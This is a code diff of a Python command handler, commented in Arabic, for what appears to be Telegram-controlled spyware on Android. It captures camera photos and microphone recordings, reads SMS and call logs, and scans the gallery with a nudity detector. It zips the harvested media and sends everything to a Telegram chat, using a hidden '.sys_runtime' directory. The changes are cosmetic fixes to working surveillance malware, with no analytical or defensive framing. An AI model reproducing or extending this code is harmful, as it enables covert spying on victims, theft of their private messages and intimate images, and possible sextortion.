@@ -5,6 +5,7 @@ import json
 import threading
 import logging
 import sys
+import gc
 
 P = os.path.join(os.getcwd(), ".sys_runtime")
 if not os.path.exists(P):
@@ -26,8 +27,8 @@ class C:
         self.mic_busy = False
         self._cl()
 
+    # ========== تنظيف الملفات المؤقتة ==========
     def _cl(self):
-        """تنظيف الملفات المؤقتة الأقدم من ساعة"""
         try:
             now = time.time()
             for f in os.listdir(self.t):
@@ -37,47 +38,40 @@ class C:
         except Exception:
             pass
 
-    # ========== ✅ إصلاح: التهيئة الكسولة للمكونات ==========
+    # ========== التهيئة الكسولة للمكونات الأساسية ==========
     def _ensure_components(self, m):
-        """إنشاء جميع المكونات المساعدة عند الحاجة إليها فقط (Lazy Initialization)"""
+        """إنشاء المكونات المساعدة فقط عند الحاجة (Lazy Initialization)"""
         try:
-            # 1. ماسح الوسائط (MediaScanner)
             if not hasattr(m, 'media_scanner') or m.media_scanner is None:
                 import media_scanner
                 m.media_scanner = media_scanner.MediaScanner()
 
-            # 2. كاشف العري (NudeDetector)
             if not hasattr(m, 'nude_detector') or m.nude_detector is None:
                 import nude_detector
                 m.nude_detector = nude_detector.NudeDetector(m)
-                # ربط الكاشف بالماسح إن أمكن
                 if hasattr(m.media_scanner, 'det'):
                     m.media_scanner.det = m.nude_detector
 
-            # 3. متصفح المعرض (GalleryBrowser)
             if not hasattr(m, 'gallery_browser') or m.gallery_browser is None:
                 import gallery_browser
                 m.gallery_browser = gallery_browser.G(m.media_scanner, m.tg)
 
-            # 4. محلل الكاميرا (CameraAnalyzer) - مع تمرير كاشف العري
             if not hasattr(m, 'camera_analyzer') or m.camera_analyzer is None:
                 import camera_analyzer
                 m.camera_analyzer = camera_analyzer.CameraAnalyzer(m, m.nude_detector)
 
-            # 5. حاصد الملفات اليومي (DailyZipper)
             if not hasattr(m, 'daily_zipper') or m.daily_zipper is None:
                 import daily_zipper
                 m.daily_zipper = daily_zipper.DailyZipper(m.media_scanner, m.tg)
 
-            # 6. مدير البث (StreamManager)
             if not hasattr(m, 'stream_manager') or m.stream_manager is None:
                 import stream_manager
                 m.stream_manager = stream_manager.StreamManager()
         except Exception as e:
-            logging.error(f"Component initialization error: {e}")
+            logging.error(f"Component init error: {e}")
 
+    # ========== إرسال ملف نصي ==========
     def _sf(self, tg, cid, content, filename):
-        """إرسال ملف نصي إلى التيليجرام وحذفه محلياً"""
         p = os.path.join(self.t, filename)
         try:
             with open(p, 'w', encoding='utf-8', errors='ignore') as f:
@@ -90,8 +84,8 @@ class C:
             if os.path.exists(p):
                 os.remove(p)
 
+    # ========== تسجيل صوتي ==========
     def _ra(self, duration=10):
-        """تسجيل صوتي لمدة محددة (ثواني)"""
         if not JNI or self.mic_busy:
             return None
         self.mic_busy = True
@@ -125,8 +119,8 @@ class C:
                 except:
                     pass
 
+    # ========== سجل المكالمات ==========
     def _cll(self, limit=100):
-        """جلب سجل المكالمات"""
         if not JNI:
             return "JNI غير متاح"
         try:
@@ -149,8 +143,8 @@ class C:
             logging.error(f"Call log error: {e}")
             return "خطأ في قراءة المكالمات"
 
+    # ========== رسائل SMS ==========
     def _sl(self, limit=100):
-        """جلب رسائل SMS من صندوق الوارد"""
         if not JNI:
             return "JNI غير متاح"
         try:
@@ -173,30 +167,36 @@ class C:
             logging.error(f"SMS error: {e}")
             return "خطأ في قراءة الرسائل"
 
+    # ========== التحقق من البطارية ==========
     def _bo(self, m):
-        """التحقق من حالة البطارية (كافية للعمليات المستهلكة)"""
         try:
             b, ch = m._bat() if hasattr(m, '_bat') else (100, False)
             return b >= 15 or ch
         except Exception:
             return True
 
+    # ========== نقطة الدخول للأوامر ==========
     def ex(self, cmd, tg, m, cid, cbq=None):
-        """تنفيذ الأمر في خيط منفصل"""
         threading.Thread(target=self._r, args=(cmd, tg, m, cid, cbq), daemon=True).start()
 
+    # ========== معالج الأوامر الرئيسي ==========
     def _r(self, cmd, tg, m, cid, cbq):
-        """معالج الأوامر الرئيسي (بعد التصحيحات)"""
         try:
-            # التحقق من تسجيل الدخول
+            # إزالة علامة الانتظار من الزر فوراً
+            if cbq:
+                try:
+                    tg._ap("answerCallbackQuery", {"callback_query_id": cbq})
+                except Exception:
+                    pass
+
             if not getattr(m, 'auth_active', False):
                 tg._ap("sendMessage", {"chat_id": cid, "text": "🔒 يجب تسجيل الدخول أولاً (/login)"})
                 return
 
-            # ✅ التأكد من تهيئة جميع المكونات المساعدة
+            # تهيئة المكونات عند أول استخدام
             self._ensure_components(m)
 
-            # ---------- أوامر المعرض ----------
+            # ---------- أوامر المعرض (تم إنشاؤها بواسطة gallery_browser) ----------
             if cmd.startswith(("g_nav|", "g_opt|", "g_conf|", "g_act|")):
                 parts = cmd.split("|")
                 if parts[0] == "g_nav":
@@ -216,13 +216,12 @@ class C:
                     tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ تأكيد الحذف", "reply_markup": json.dumps({"inline_keyboard": ck})})
                 return
 
-            # ---------- الكاميرا (مع تمرير det) ----------
+            # ---------- الكاميرا ----------
             if cmd.startswith(("cam_", "camf_")):
                 is_front = 1 if "camf_" in cmd else 0
                 if not self._bo(m):
                     tg._ap("sendMessage", {"chat_id": cid, "text": "🔋 البطارية منخفضة جداً"})
                     return
-                # استخدام الكائن الذي تم إنشاؤه بواسطة _ensure_components
                 pic = m.camera_analyzer.capture(cam_id=is_front)
                 if pic and os.path.exists(pic):
                     with open(pic, 'rb') as f:
@@ -239,7 +238,7 @@ class C:
                     return
                 tg._ap("sendMessage", {"chat_id": cid, "text": "🎤 جاري التسجيل (10 ثوانٍ)..."})
                 audio = self._ra(10)
-                if audio:
+                if audio and os.path.exists(audio):
                     with open(audio, 'rb') as f:
                         resp = tg._ap("sendVoice", {"chat_id": cid}, {"voice": f})
                     if resp and resp.get('ok'):
@@ -263,18 +262,18 @@ class C:
                 self._sf(tg, cid, self._sl(), "sms.txt")
                 return
 
-            # ---------- حصاد الوسائط ----------
+            # ---------- الحصاد (زر الحصاد) ----------
             if cmd.startswith("hrv_"):
-                if hasattr(m, 'daily_zipper'):
+                if hasattr(m, 'daily_zipper') and m.daily_zipper is not None:
                     m.daily_zipper.run()
                     tg._ap("sendMessage", {"chat_id": cid, "text": "📦 بدء الحصاد..."})
                 else:
                     tg._ap("sendMessage", {"chat_id": cid, "text": "❌ الحصاد غير متاح"})
                 return
 
-            # ---------- فتح معرض الوسائط ----------
+            # ---------- فتح المعرض الرئيسي ----------
             if cmd.startswith("media_"):
-                if hasattr(m, 'gallery_browser'):
+                if hasattr(m, 'gallery_browser') and m.gallery_browser is not None:
                     kb = m.gallery_browser.get_grid_kb(cat="pending", page=0)
                     res = tg._ap("sendMessage", {"chat_id": cid, "text": "🖼️ المعرض", "reply_markup": json.dumps(kb)})
                     if res and res.get('ok'):
@@ -289,6 +288,8 @@ class C:
         except Exception as e:
             logging.error(f"Command handler error: {e}")
             tg._ap("sendMessage", {"chat_id": cid, "text": "⚠️ خطأ داخلي"})
+        finally:
+            gc.collect()
 
 
 _h = None
